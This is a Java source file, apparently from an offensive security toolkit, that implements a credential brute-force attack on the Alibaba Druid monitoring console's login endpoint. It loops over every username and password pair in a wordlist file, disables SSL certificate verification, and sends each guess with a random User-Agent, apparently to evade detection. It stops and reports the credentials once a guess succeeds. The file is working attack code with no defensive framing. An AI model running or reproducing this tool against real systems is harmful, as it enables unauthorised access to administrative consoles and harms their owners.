package src.main.module;

import src.main.common.UA_Config;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Stream;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class DruidBruteForce {
    String address;

    List<String> credentials = new ArrayList<>();

    boolean success = false;

    public DruidBruteForce(String address) {
        this.address = address;
    }

    // 初始化用户名和密码字典
    public void initializeCredentials() throws IOException {
        String filePath = System.getProperty("user.dir") + "/resources/user.txt";
        File file = new File(filePath);
        try (BufferedReader br = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = br.readLine()) != null) {
                credentials.add(line.trim());  // 去除每行的空格并添加到列表
            }
        }
    }

    // 负责主要爆破逻辑的函数
    public Stream<String> BruteDruid() throws IOException, InterruptedException {
        // 当爆到密码就不会继续爆破，返回密码
        initializeCredentials();
        disableSSLVerification();
        Stream.Builder<String> builder = Stream.builder();
        String api = "/druid/submitLogin";
        String res = "";
        String site = address + api;
        String ua = "";
        // 遍历用户名和密码进行爆破
        for (String username : credentials) {
            for (String password : credentials) {
                String postData = "loginUsername=" + URLEncoder.encode(username, "UTF-8") +
                        "&loginPassword=" + URLEncoder.encode(password, "UTF-8");
                // 发送POST数据
                URL obj = new URL(site);
                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
                UA_Config uacf = new UA_Config();
                List<String> ualist = uacf.loadUserAgents();
                ua = uacf.getRandomUserAgent(ualist);
                conn.setRequestProperty("User-Agent",ua);
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(postData.getBytes());
                    os.flush();
                }
                // 读取服务器响应
                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                    res = inputLine.toString();
                }
                in.close();
                if (res.contains("success")) {
                    String result = "爆破成功！用户名：" +username + " " + "密码：" + password;
                    builder.add(result);
                    success = true;
                    break;
                } else {
                    String result ="爆破失败！用户名" + username + " " + "密码：" + password;
                    builder.add(result);
                }
                Thread.sleep(1000);
            }
            if (success){
                break;
            }
        }
        return builder.build();
    }
}